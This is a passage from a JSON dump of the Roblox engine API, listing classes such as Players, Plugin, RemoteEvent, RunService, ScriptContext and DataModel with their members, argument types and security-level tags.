Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":null}],"Name":"TeamChat","tags":["PluginSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":null},{"Type":"Instance","Name":"player","Default":null}],"Name":"WhisperChat","tags":["LocalUserSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"character","Default":null}],"Name":"getPlayerFromCharacter","tags":["deprecated"],"Class":"Players","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"getPlayers","tags":["deprecated"],"Class":"Players","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"character","Default":null}],"Name":"playerFromCharacter","tags":["deprecated"],"Class":"Players","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"players","tags":["deprecated"],"Class":"Players","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"int","Name":"blockerUserId","Default":null},{"Type":"int","Name":"blockeeUserId","Default":null}],"Name":"BlockUser","tags":["RobloxScriptSecurity"],"Class":"Players","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetCharacterAppearanceAsync","tags":[],"Class":"Players","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetFriendsAsync","tags":[],"Class":"Players","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetNameFromUserIdAsync","tags":[],"Class":"Players","type":"YieldFunction"},{"ReturnType":"int","Arguments":[{"Type":"string","Name":"userName","Default":null}],"Name":"GetUserIdFromNameAsync","tags":[],"Class":"Players","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"int","Name":"exblockerUserId","Default":null},{"Type":"int","Name":"exblockeeUserId","Default":null}],"Name":"UnblockUser","tags":["RobloxScriptSecurity"],"Class":"Players","type":"YieldFunction"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"player","Type":"Instance"},{"Name":"friendRequestEvent","Type":"FriendRequestEvent"}],"Name":"FriendRequestEvent","tags":["RobloxScriptSecurity"],"Class":"Players","type":"Event"},{"Arguments":[{"Name":"message","Type":"string"}],"Name":"GameAnnounce","tags":["RobloxScriptSecurity"],"Class":"Players","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"}],"Name":"PlayerAdded","tags":[],"Class":"Players","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"}],"Name":"PlayerAddedEarly","tags":["LocalUserSecurity"],"Class":"Players","type":"Event"},{"Arguments":[{"Name":"chatType","Type":"PlayerChatType"},{"Name":"player","Type":"Instance"},{"Name":"message","Type":"string"},{"Name":"targetPlayer","Type":"Instance"}],"Name":"PlayerChatted","tags":["LocalUserSecurity"],"Class":"Players","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"}],"Name":"PlayerRemoving","tags":[],"Class":"Players","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"}],"Name":"PlayerRemovingLate","tags":["LocalUserSecurity"],"Class":"Players","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Plugin","tags":[]},{"ValueType":"bool","type":"Property","Name":"CollisionEnabled","tags":["readonly"],"Class":"Plugin"},{"ValueType":"float","type":"Property","Name":"GridSize","tags":["readonly"],"Class":"Plugin"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"exclusiveMouse","Default":null}],"Name":"Activate","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"name","Default":null}],"Name":"CreateToolbar","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"JointCreationMode","Arguments":[],"Name":"GetJoinMode","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetMouse","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"Variant","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"GetSetting","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"int","Arguments":[],"Name":"GetStudioUserId","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"Objects","Arguments":[{"Type":"Objects","Name":"objects","Default":null}],"Name":"Negate","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"script","Default":null},{"Type":"int","Name":"lineNumber","Default":"0"}],"Name":"OpenScript","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"OpenWikiPage","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"SaveSelectedToRoblox","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"Objects","Arguments":[{"Type":"Objects","Name":"objects","Default":null}],"Name":"Separate","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"Variant","Name":"value","Default":null}],"Name":"SetSetting","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Objects","Name":"objects","Default":null}],"Name":"Union","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"int","Arguments":[{"Type":"string","Name":"assetType","Default":null}],"Name":"PromptForExistingAssetId","tags":["PluginSecurity"],"Class":"Plugin","type":"YieldFunction"},{"Arguments":[],"Name":"Deactivation","tags":["PluginSecurity"],"Class":"Plugin","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"PluginManager","tags":[]},{"ReturnType":"Instance","Arguments":[],"Name":"CreatePlugin","tags":["PluginSecurity"],"Class":"PluginManager","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"filePath","Default":""}],"Name":"ExportPlace","tags":["PluginSecurity"],"Class":"PluginManager","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"filePath","Default":""}],"Name":"ExportSelection","tags":["PluginSecurity"],"Class":"PluginManager","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"PointsService","tags":["notCreatable"]},{"ReturnType":"int","Arguments":[],"Name":"GetAwardablePoints","tags":["deprecated"],"Class":"PointsService","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"int","Name":"amount","Default":null}],"Name":"AwardPoints","tags":[],"Class":"PointsService","type":"YieldFunction"},{"ReturnType":"int","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetGamePointBalance","tags":[],"Class":"PointsService","type":"YieldFunction"},{"ReturnType":"int","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetPointBalance","tags":["deprecated"],"Class":"PointsService","type":"YieldFunction"},{"Arguments":[{"Name":"userId","Type":"int"},{"Name":"pointsAwarded","Type":"int"},{"Name":"userBalanceInGame","Type":"int"},{"Name":"userTotalBalance","Type":"int"}],"Name":"PointsAwarded","tags":[],"Class":"PointsService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Pose","tags":[]},{"ValueType":"CoordinateFrame","type":"Property","Name":"CFrame","tags":[],"Class":"Pose"},{"ValueType":"PoseEasingDirection","type":"Property","Name":"EasingDirection","tags":[],"Class":"Pose"},{"ValueType":"PoseEasingStyle","type":"Property","Name":"EasingStyle","tags":[],"Class":"Pose"},{"ValueType":"float","type":"Property","Name":"MaskWeight","tags":[],"Class":"Pose"},{"ValueType":"float","type":"Property","Name":"Weight","tags":[],"Class":"Pose"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"pose","Default":null}],"Name":"AddSubPose","tags":[],"Class":"Pose","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetSubPoses","tags":[],"Class":"Pose","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"pose","Default":null}],"Name":"RemoveSubPose","tags":[],"Class":"Pose","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"PostEffect","tags":[]},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"PostEffect"},{"Superclass":"PostEffect","type":"Class","Name":"BloomEffect","tags":[]},{"ValueType":"float","type":"Property","Name":"Intensity","tags":[],"Class":"BloomEffect"},{"ValueType":"float","type":"Property","Name":"Size","tags":[],"Class":"BloomEffect"},{"ValueType":"float","type":"Property","Name":"Threshold","tags":[],"Class":"BloomEffect"},{"Superclass":"PostEffect","type":"Class","Name":"BlurEffect","tags":[]},{"ValueType":"float","type":"Property","Name":"Size","tags":[],"Class":"BlurEffect"},{"Superclass":"PostEffect","type":"Class","Name":"ColorCorrectionEffect","tags":[]},{"ValueType":"float","type":"Property","Name":"Brightness","tags":[],"Class":"ColorCorrectionEffect"},{"ValueType":"float","type":"Property","Name":"Contrast","tags":[],"Class":"ColorCorrectionEffect"},{"ValueType":"float","type":"Property","Name":"Saturation","tags":[],"Class":"ColorCorrectionEffect"},{"ValueType":"Color3","type":"Property","Name":"TintColor","tags":[],"Class":"ColorCorrectionEffect"},{"Superclass":"PostEffect","type":"Class","Name":"SunRaysEffect","tags":[]},{"ValueType":"float","type":"Property","Name":"Intensity","tags":[],"Class":"SunRaysEffect"},{"ValueType":"float","type":"Property","Name":"Spread","tags":[],"Class":"SunRaysEffect"},{"Superclass":"Instance","type":"Class","Name":"RayValue","tags":[]},{"ValueType":"Ray","type":"Property","Name":"Value","tags":[],"Class":"RayValue"},{"Arguments":[{"Name":"value","Type":"Ray"}],"Name":"Changed","tags":[],"Class":"RayValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"Ray"}],"Name":"changed","tags":["deprecated"],"Class":"RayValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadata","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadataCallbacks","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadataClasses","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadataEnums","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadataEvents","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadataFunctions","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadataItem","tags":[]},{"ValueType":"bool","type":"Property","Name":"Browsable","tags":[],"Class":"ReflectionMetadataItem"},{"ValueType":"bool","type":"Property","Name":"Deprecated","tags":[],"Class":"ReflectionMetadataItem"},{"ValueType":"bool","type":"Property","Name":"IsBackend","tags":[],"Class":"ReflectionMetadataItem"},{"ValueType":"double","type":"Property","Name":"UIMaximum","tags":[],"Class":"ReflectionMetadataItem"},{"ValueType":"double","type":"Property","Name":"UIMinimum","tags":[],"Class":"ReflectionMetadataItem"},{"ValueType":"string","type":"Property","Name":"summary","tags":[],"Class":"ReflectionMetadataItem"},{"Superclass":"ReflectionMetadataItem","type":"Class","Name":"ReflectionMetadataClass","tags":[]},{"ValueType":"int","type":"Property","Name":"ExplorerImageIndex","tags":[],"Class":"ReflectionMetadataClass"},{"ValueType":"int","type":"Property","Name":"ExplorerOrder","tags":[],"Class":"ReflectionMetadataClass"},{"ValueType":"bool","type":"Property","Name":"Insertable","tags":[],"Class":"ReflectionMetadataClass"},{"ValueType":"string","type":"Property","Name":"PreferredParent","tags":[],"Class":"ReflectionMetadataClass"},{"Superclass":"ReflectionMetadataItem","type":"Class","Name":"ReflectionMetadataEnum","tags":[]},{"Superclass":"ReflectionMetadataItem","type":"Class","Name":"ReflectionMetadataEnumItem","tags":[]},{"Superclass":"ReflectionMetadataItem","type":"Class","Name":"ReflectionMetadataMember","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadataProperties","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadataYieldFunctions","tags":[]},{"Superclass":"Instance","type":"Class","Name":"RemoteEvent","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"Tuple","Name":"arguments","Default":null}],"Name":"FireAllClients","tags":[],"Class":"RemoteEvent","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"Tuple","Name":"arguments","Default":null}],"Name":"FireClient","tags":[],"Class":"RemoteEvent","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Tuple","Name":"arguments","Default":null}],"Name":"FireServer","tags":[],"Class":"RemoteEvent","type":"Function"},{"Arguments":[{"Name":"arguments","Type":"Tuple"}],"Name":"OnClientEvent","tags":[],"Class":"RemoteEvent","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"arguments","Type":"Tuple"}],"Name":"OnServerEvent","tags":[],"Class":"RemoteEvent","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"RemoteFunction","tags":[]},{"ReturnType":"Tuple","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"Tuple","Name":"arguments","Default":null}],"Name":"InvokeClient","tags":[],"Class":"RemoteFunction","type":"YieldFunction"},{"ReturnType":"Tuple","Arguments":[{"Type":"Tuple","Name":"arguments","Default":null}],"Name":"InvokeServer","tags":[],"Class":"RemoteFunction","type":"YieldFunction"},{"ReturnType":"Tuple","Arguments":[{"Name":"arguments","Type":"Tuple"}],"Name":"OnClientInvoke","tags":[],"Class":"RemoteFunction","type":"Callback"},{"ReturnType":"Tuple","Arguments":[{"Name":"player","Type":"Instance"},{"Name":"arguments","Type":"Tuple"}],"Name":"OnServerInvoke","tags":[],"Class":"RemoteFunction","type":"Callback"},{"Superclass":"Instance","type":"Class","Name":"RenderHooksService","tags":[]},{"ReturnType":"void","Arguments":[],"Name":"CaptureMetrics","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"qId","Default":null}],"Name":"DisableQueue","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"enabled","Default":null}],"Name":"EnableAdorns","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"qId","Default":null}],"Name":"EnableQueue","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"double","Arguments":[],"Name":"GetDeltaAve","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"double","Arguments":[],"Name":"GetGPUDelay","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"double","Arguments":[],"Name":"GetPresentTime","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"double","Arguments":[],"Name":"GetRenderAve","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"double","Arguments":[],"Name":"GetRenderConfMax","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"double","Arguments":[],"Name":"GetRenderConfMin","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"double","Arguments":[],"Name":"GetRenderStd","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"PrintScene","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ReloadShaders","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"width","Default":null},{"Type":"int","Name":"height","Default":null}],"Name":"ResizeWindow","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"RenderSettings","tags":["notbrowsable"]},{"ValueType":"AASamples","type":"Property","Name":"AASamples","tags":[],"Class":"RenderSettings"},{"ValueType":"Antialiasing","type":"Property","Name":"Antialiasing","tags":[],"Class":"RenderSettings"},{"ValueType":"int","type":"Property","Name":"AutoFRMLevel","tags":[],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"DebugDisableInterpolation","tags":[],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"EagerBulkExecution","tags":[],"Class":"RenderSettings"},{"ValueType":"QualityLevel","type":"Property","Name":"EditQualityLevel","tags":[],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"EnableFRM","tags":["hidden"],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"ExportMergeByMaterial","tags":[],"Class":"RenderSettings"},{"ValueType":"FramerateManagerMode","type":"Property","Name":"FrameRateManager","tags":[],"Class":"RenderSettings"},{"ValueType":"GraphicsMode","type":"Property","Name":"GraphicsMode","tags":[],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"IsAggregationShown","tags":[],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"IsSynchronizedWithPhysics","tags":[],"Class":"RenderSettings"},{"ValueType":"int","type":"Property","Name":"MeshCacheSize","tags":[],"Class":"RenderSettings"},{"ValueType":"QualityLevel","type":"Property","Name":"QualityLevel","tags":[],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"ReloadAssets","tags":[],"Class":"RenderSettings"},{"ValueType":"Resolution","type":"Property","Name":"Resolution","tags":[],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"ShowBoundingBoxes","tags":[],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"ShowInterpolationpath","tags":[],"Class":"RenderSettings"},{"ValueType":"int","type":"Property","Name":"TextureCacheSize","tags":[],"Class":"RenderSettings"},{"ReturnType":"int","Arguments":[],"Name":"GetMaxQualityLevel","tags":[],"Class":"RenderSettings","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"ReplicatedFirst","tags":["notCreatable"]},{"ReturnType":"bool","Arguments":[],"Name":"IsDefaultLoadingGuiRemoved","tags":["RobloxScriptSecurity"],"Class":"ReplicatedFirst","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsFinishedReplicating","tags":["RobloxScriptSecurity"],"Class":"ReplicatedFirst","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"RemoveDefaultLoadingScreen","tags":[],"Class":"ReplicatedFirst","type":"Function"},{"Arguments":[],"Name":"FinishedReplicating","tags":["RobloxScriptSecurity"],"Class":"ReplicatedFirst","type":"Event"},{"Arguments":[],"Name":"RemoveDefaultLoadingGuiSignal","tags":["RobloxScriptSecurity"],"Class":"ReplicatedFirst","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ReplicatedStorage","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"RobloxReplicatedStorage","tags":["notCreatable","notbrowsable"]},{"Superclass":"Instance","type":"Class","Name":"RunService","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"int","Name":"priority","Default":null},{"Type":"Function","Name":"function","Default":null}],"Name":"BindToRenderStep","tags":[],"Class":"RunService","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsClient","tags":[],"Class":"RunService","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsRunMode","tags":[],"Class":"RunService","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsRunning","tags":["RobloxScriptSecurity"],"Class":"RunService","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsServer","tags":[],"Class":"RunService","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsStudio","tags":[],"Class":"RunService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Pause","tags":["PluginSecurity"],"Class":"RunService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Reset","tags":["PluginSecurity","deprecated"],"Class":"RunService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Run","tags":["PluginSecurity"],"Class":"RunService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Stop","tags":["PluginSecurity"],"Class":"RunService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"name","Default":null}],"Name":"UnbindFromRenderStep","tags":[],"Class":"RunService","type":"Function"},{"Arguments":[{"Name":"step","Type":"double"}],"Name":"Heartbeat","tags":[],"Class":"RunService","type":"Event"},{"Arguments":[{"Name":"step","Type":"double"}],"Name":"RenderStepped","tags":[],"Class":"RunService","type":"Event"},{"Arguments":[{"Name":"time","Type":"double"},{"Name":"step","Type":"double"}],"Name":"Stepped","tags":[],"Class":"RunService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"RuntimeScriptService","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"ScriptContext","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"ScriptsDisabled","tags":["LocalUserSecurity"],"Class":"ScriptContext"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"assetId","Default":null},{"Type":"Instance","Name":"parent","Default":null},{"Type":"string","Name":"name","Default":null}],"Name":"AddCoreScript","tags":["RobloxScriptSecurity"],"Class":"ScriptContext","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"Instance","Name":"parent","Default":null}],"Name":"AddCoreScriptLocal","tags":["RobloxScriptSecurity"],"Class":"ScriptContext","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"assetId","Default":null}],"Name":"AddStarterScript","tags":["LocalUserSecurity"],"Class":"ScriptContext","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"bool","Name":"clearHighwaterMark","Default":"true"}],"Name":"GetHeapStats","tags":["RobloxScriptSecurity"],"Class":"ScriptContext","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetScriptStats","tags":["RobloxScriptSecurity"],"Class":"ScriptContext","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"enable","Default":"false"}],"Name":"SetCollectScriptStats","tags":["RobloxScriptSecurity"],"Class":"ScriptContext","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"double","Name":"seconds","Default":null}],"Name":"SetTimeout","tags":["PluginSecurity"],"Class":"ScriptContext","type":"Function"},{"Arguments":[{"Name":"object","Type":"Instance"},{"Name":"member","Type":"string"},{"Name":"script","Type":"Instance"}],"Name":"CamelCaseViolation","tags":["RobloxScriptSecurity"],"Class":"ScriptContext","type":"Event"},{"Arguments":[{"Name":"message","Type":"string"},{"Name":"stackTrace","Type":"string"},{"Name":"script","Type":"Instance"}],"Name":"Error","tags":[],"Class":"ScriptContext","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ScriptDebugger","tags":["notCreatable"]},{"ValueType":"int","type":"Property","Name":"CurrentLine","tags":["readonly"],"Class":"ScriptDebugger"},{"ValueType":"bool","type":"Property","Name":"IsDebugging","tags":["readonly"],"Class":"ScriptDebugger"},{"ValueType":"bool","type":"Property","Name":"IsPaused","tags":["readonly"],"Class":"ScriptDebugger"},{"ValueType":"Object","type":"Property","Name":"Script","tags":["readonly"],"Class":"ScriptDebugger"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"expression","Default":null}],"Name":"AddWatch","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetBreakpoints","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"Map","Arguments":[],"Name":"GetGlobals","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"Map","Arguments":[{"Type":"int","Name":"stackFrame","Default":"0"}],"Name":"GetLocals","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetStack","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"Map","Arguments":[{"Type":"int","Name":"stackFrame","Default":"0"}],"Name":"GetUpvalues","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"Variant","Arguments":[{"Type":"Instance","Name":"watch","Default":null}],"Name":"GetWatchValue","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetWatches","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Resume","tags":["deprecated"],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"line","Default":null}],"Name":"SetBreakpoint","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"Variant","Name":"value","Default":null}],"Name":"SetGlobal","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"Variant","Name":"value","Default":null},{"Type":"int","Name":"stackFrame","Default":"0"}],"Name":"SetLocal","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"Variant","Name":"value","Default":null},{"Type":"int","Name":"stackFrame","Default":"0"}],"Name":"SetUpvalue","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"StepIn","tags":["deprecated"],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"StepOut","tags":["deprecated"],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"StepOver","tags":["deprecated"],"Class":"ScriptDebugger","type":"Function"},{"Arguments":[{"Name":"breakpoint","Type":"Instance"}],"Name":"BreakpointAdded","tags":[],"Class":"ScriptDebugger","type":"Event"},{"Arguments":[{"Name":"breakpoint","Type":"Instance"}],"Name":"BreakpointRemoved","tags":[],"Class":"ScriptDebugger","type":"Event"},{"Arguments":[{"Name":"line","Type":"int"}],"Name":"EncounteredBreak","tags":[],"Class":"ScriptDebugger","type":"Event"},{"Arguments":[],"Name":"Resuming","tags":[],"Class":"ScriptDebugger","type":"Event"},{"Arguments":[{"Name":"watch","Type":"Instance"}],"Name":"WatchAdded","tags":[],"Class":"ScriptDebugger","type":"Event"},{"Arguments":[{"Name":"watch","Type":"Instance"}],"Name":"WatchRemoved","tags":[],"Class":"ScriptDebugger","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ScriptInformationProvider","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"access","Default":null}],"Name":"SetAccessKey","tags":["RobloxSecurity"],"Class":"ScriptInformationProvider","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetAssetUrl","tags":["LocalUserSecurity"],"Class":"ScriptInformationProvider","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"ScriptService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"Selection","tags":[]},{"ReturnType":"Objects","Arguments":[],"Name":"Get","tags":["PluginSecurity"],"Class":"Selection","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Objects","Name":"selection","Default":null}],"Name":"Set","tags":["PluginSecurity"],"Class":"Selection","type":"Function"},{"Arguments":[],"Name":"SelectionChanged","tags":[],"Class":"Selection","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ServerScriptService","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"ServerStorage","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"ServiceProvider","tags":["notbrowsable"]},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"className","Default":null}],"Name":"FindService","tags":[],"Class":"ServiceProvider","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"className","Default":null}],"Name":"GetService","tags":[],"Class":"ServiceProvider","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"className","Default":null}],"Name":"getService","tags":["deprecated"],"Class":"ServiceProvider","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"className","Default":null}],"Name":"service","tags":["deprecated"],"Class":"ServiceProvider","type":"Function"},{"Arguments":[],"Name":"Close","tags":[],"Class":"ServiceProvider","type":"Event"},{"Arguments":[],"Name":"CloseLate","tags":["LocalUserSecurity"],"Class":"ServiceProvider","type":"Event"},{"Arguments":[{"Name":"service","Type":"Instance"}],"Name":"ServiceAdded","tags":[],"Class":"ServiceProvider","type":"Event"},{"Arguments":[{"Name":"service","Type":"Instance"}],"Name":"ServiceRemoving","tags":[],"Class":"ServiceProvider","type":"Event"},{"Superclass":"ServiceProvider","type":"Class","Name":"DataModel","tags":[]},{"ValueType":"int","type":"Property","Name":"CreatorId","tags":["readonly"],"Class":"DataModel"},{"ValueType":"CreatorType","type":"Property","Name":"CreatorType","tags":["readonly"],"Class":"DataModel"},{"ValueType":"GearGenreSetting","type":"Property","Name":"GearGenreSetting","tags":["readonly"],"Class":"DataModel"},{"ValueType":"Genre","type":"Property","Name":"Genre","tags":["readonly"],"Class":"DataModel"},{"ValueType":"bool","type":"Property","Name":"IsPersonalServer","tags":["RobloxScriptSecurity"],"Class":"DataModel"},{"ValueType":"string","type":"Property","Name":"JobId","tags":["readonly"],"Class":"DataModel"},{"ValueType":"bool","type":"Property","Name":"LocalSaveEnabled","tags":["RobloxScriptSecurity","readonly"],"Class":"DataModel"},{"ValueType":"int","type":"Property","Name":"PlaceId","tags":["readonly"],"Class":"DataModel"},{"ValueType":"int","type":"Property","Name":"PlaceVersion","tags":["readonly"],"Class":"DataModel"},{"ValueType":"string","type":"Property","Name":"VIPServerId","tags":["readonly"],"Class":"DataModel"},{"ValueType":"int","type":"Property","Name":"VIPServerOwnerId","tags":["readonly"],"Class":"DataModel"},{"ValueType":"Object","type":"Property","Name":"Workspace","tags":["readonly"],"Class":"DataModel"},{"ValueType":"Object","type":"Property